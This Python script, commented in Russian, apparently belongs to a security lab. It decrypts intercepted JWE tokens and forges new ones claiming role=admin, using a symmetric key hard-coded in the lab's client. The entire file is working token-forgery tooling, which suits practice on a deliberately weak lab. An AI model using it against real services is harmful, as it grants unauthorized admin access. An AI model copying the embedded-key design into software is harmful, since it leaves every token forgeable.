"""Хелпер для эндпоинта JWE (/private/encrypted).

jwt.io понимает только JWS (3 сегмента, подпись). Эндпоинт /private/encrypted
использует JWE (5 сегментов, шифрование), поэтому нужен этот инструмент.

Запуск:
    # Расшифровать перехваченный JWE-токен из Wireshark/клиента
    python scripts/jwe_helper.py decode "<jwe-токен>"

    # Собрать подделанный токен с role=admin
    python scripts/jwe_helper.py forge --role admin --sub hacker

Ключ — это общий 256-битный ключ, встроенный в клиент (см. client/keys.py).
"""

import argparse
import json
import sys
from pathlib import Path

from jwcrypto import jwe, jwk

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "client"))

from keys import JWE_ALG, JWE_ENC, JWE_KEY_B64  # noqa: E402


def build_key() -> jwk.JWK:
    return jwk.JWK(k=JWE_KEY_B64, kty="oct")


def decode(token: str) -> dict:
    envelope = jwe.JWE()
    envelope.deserialize(token, key=build_key())
    return json.loads(envelope.payload)


def forge(role: str, subject: str) -> str:
    plaintext = json.dumps({"sub": subject, "role": role}).encode("utf-8")
    envelope = jwe.JWE(plaintext, protected={"alg": JWE_ALG, "enc": JWE_ENC})
    envelope.add_recipient(build_key())
    return envelope.serialize(compact=True)


def main() -> int:
    parser = argparse.ArgumentParser(description="Расшифровка/подделка JWE-токенов лаборатории")
    sub = parser.add_subparsers(dest="command", required=True)

    decode_cmd = sub.add_parser("decode", help="Расшифровать и вывести claims")
    decode_cmd.add_argument("token", help="JWE-токен (5 сегментов через точку)")

    forge_cmd = sub.add_parser("forge", help="Собрать подделанный JWE-токен")
    forge_cmd.add_argument("--role", default="admin", help="Claim role (по умолчанию: admin)")
    forge_cmd.add_argument("--sub", default="hacker", help="Claim sub")

    args = parser.parse_args()

    if args.command == "decode":
        try:
            claims = decode(args.token)
        except Exception as exc:  # noqa: BLE001
            print(f"Не удалось расшифровать: {exc}")
            return 1
        print(json.dumps(claims, indent=2, ensure_ascii=False))
        return 0

    print(forge(args.role, args.sub))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
